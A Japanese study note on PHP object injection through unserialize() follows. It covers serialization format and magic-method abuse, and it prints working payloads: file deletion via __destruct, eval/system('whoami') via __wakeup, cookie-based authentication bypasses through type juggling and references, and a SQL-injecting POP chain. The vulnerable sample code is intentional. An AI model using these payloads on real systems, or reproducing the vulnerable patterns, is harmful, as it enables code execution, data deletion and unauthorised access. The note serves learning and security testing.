# Unserialize
## Serializeの基本
```php
<?php
class Example1{
    public $cache_file;
}
class Example2{
    public $cache_file;
    public $array = array("key" => 100);
}

$ex1 = new Example1();
echo serialize($ex1)."\n";  // O:8:"Example1":1:{s:10:"cache_file";N;}
$ex1->cache_file = "index.php";
echo serialize($ex1)."\n";  // O:8:"Example1":1:{s:10:"cache_file";s:9:"index.php";}

$ex2 = new Example2();
echo serialize($ex2)."\n";  // O:8:"Example2":2:{s:10:"cache_file";N;s:5:"array";a:1:{s:3:"key";i:100;}}

// O:8:"Example2":2:{s:10:"cache_file";N;s:5:"array";a:1:{s:3:"key";i:100;}}
// Oは「”Example2”というObjectをシリアル化している」の意味
// 8は”Example2”の文字数
// 2は「フィールドが二つある」の意味
// sはStringの意味？
// 10は"cache_file"の文字数
// Nは値がセットされていないという意味。{変数名;値}でワンセットっぽい
// 最後の"i:100;"はint型の値100という意味
?>
```
## __destruct
```php
class Example1
{
   public $cache_file;

   function __construct(){
      // some PHP code...
   }
   // インスタンス削除時にデストラクタを実行して$cache_fileを削除する
   function __destruct(){
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}

// some PHP code...

// GETメソッドの?data=以降の値をデシリアライズする
$user_data = unserialize($_GET['data']);

// some PHP code..
```
以下で、Example1クラスのオブジェクトとして復元して、Example1クラスのインスタンスを`$user_data`に代入するので、`$user_data`インスタンスが削除されるときに`../../index.php`が削除されてしまう！   
```txt
http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
```
## __wakeup

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        // このクラスをunserializeするときに__wakeup()を実行する
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);  // こんなことする場合ってあるのか？？
            }
        }
    }
    // $_REQUEST['r']はGETとPOSTとCOOKIEを合わせた連想配列。$_GET['r']とかと同じ
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```
GETのデータとかCookieのデータとかで`system("whoami")`を実行する。   
```txt
?r=O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
Cookie: r=O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D
```
## AuthBypass TypeJuggling
```php
// 一見、どう見ても安全に見えるが実はがちがちに脆弱。ヤバすぎてワロタ
data = unserialize($_COOKIE['auth']);

// "=="で比較しているため、TypeJugglingにより、 true(boolean) == "admin"(string) はTrueとなるので危険！
if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```
以下でAuthBypassのためのPayloadを作成。   
```php
<?php
$data = array("username" => true, "password" => true);
echo serialize($data)."\n"; // a:2:{s:8:"username";b:1;s:8:"password";b:1;}

// "username"のValueの値をBooleanのTrueにするとTypeJugglingによりAuthBypassできる！
echo gettype(true == "admin")." : ".(true == "admin")."\n";  // boolean : 1
echo gettype(true === "admin")." : ".(true === "admin")."\n"; // boolean : 
?>
```
作成した`a:2:{s:8:"username";b:1;s:8:"password";b:1;}`をURL encodeしてCookieにセットすればBypassできる！   
```txt
Cookie: auth=a%3A2%3A%7Bs%3A8%3A%22username%22%3Bb%3A1%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D
```
## AuthBypass ObjectReference
```php
<?php
class Object1{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```
以下で`$secretCode`と`$code`が同じ値を指すように参照代入したシリアライズデータを作成する。   
```php
<?php
class Object1{
    public $secretCode = "a";
    public $code;
    //public $code = &$secretCode;  // ここでやろうとするとerror。コンストラクタ内でやらないとだめらしい
    public function __construct(){
        // リファレンス(参照)代入。これで$secretCodeと$codeが同じ値を指すようになった！
        $this->code = &$this->secretCode;
    }
}
$obj1 = new Object1();
echo serialize($obj1);  // O:7:"Object1":2:{s:10:"secretCode";s:1:"a";s:4:"code";R:2;}
?>
```
以下で認証を突破できる！   
```txt
?input=O:7:"Object1":2:{s:10:"secretCode";s:1:"a";s:4:"code";R:2;}
```
## POP chain 
### __toString (SQL Injection)
```php
<?php
class Example3{
   protected $obj;

   function __construct(){
      // some PHP code...
   }
   // Exampleクラスのインスタンスが文字列として呼びだされたときに__toString()を実行
   function __toString(){
      if (isset($this->obj)) {
          // $this->objはインスタンスであるとして、そのインスタンスのgetValueメソッドを実行
          return $this->obj->getValue();
      }else{
          return "__toString else";
      }
   }
}

class SQL_Row_Value
{
   private $_table;
   private $id;

   // some PHP code...
   // getValue($id)とすると上の__toString内では引数無しで呼び出してるからエラーになる
   function getValue()
   {
      $sql = "SELECT * FROM {$this->_table} WHERE id = ".(int)$this->id;
      return $sql;
   }
}

// これをデシリアライズすればSQLインジェクションができる！
$user_data = unserialize('O:8:"Example3":1:{s:3:"obj";O:13:"SQL_Row_Value":2:{s:6:"_table";s:10:"users -- -";s:2:"id";i:2;}}');
echo $user_data;

// 実際に実行されるSQLクエリ
// SELECT * FROM users -- - WHERE id = 2
?>
```
以下でPayloadを作成するが、細部がうまいこといってないので手動で修正する。   
```php
<?php
class SQL_Row_Value{
   private $_table ="users -- -";
}

class Example3{
   protected $obj;

   function __construct()   {
      $this->obj = new SQL_Row_Value;
   }
}

print (serialize(new Example3));

// O:8:"Example3":1:{s:6:" * obj";O:13:"SQL_Row_Value":1:{s:21:"SQL_Row_Value_table";s:10:"users -- -";}}
?>
```
### __destruct (webshell)

`Gdn_Configuration`クラスのデストラクタが呼ばれるのがentrypoint。   
[2]でshutdowm()メソッドが呼ばれて[3]が実行される。    
[3]ではshutdown()メソッドの中でshutdown()メソッドが呼ばれてる。これは多分別のクラスのshutdown()メソッドを探すことになるはず？？ここでは別の`Gdn_ConfigurationSource`クラスにあるshutdown()メソッドが該当する。     
```php
class Gdn_Configuration extends Gdn_Pluggable {

    ...

    /**
     *
     */
    public function __destruct() {
        if ($this->autoSave) {                      // 1
            $this->shutdown();                      // 2
        }
    }

    /**
     *
     */
    public function shutdown() {
        foreach ($this->sources as $source) {
            $source->shutdown();                    // 3
        }
    }
```
# 参考
https://securitycafe.ro/2015/01/05/understanding-php-object-injection/   
基本的な説明。わかりやすい。   
https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/   
具体例がたくさん。よさげ。   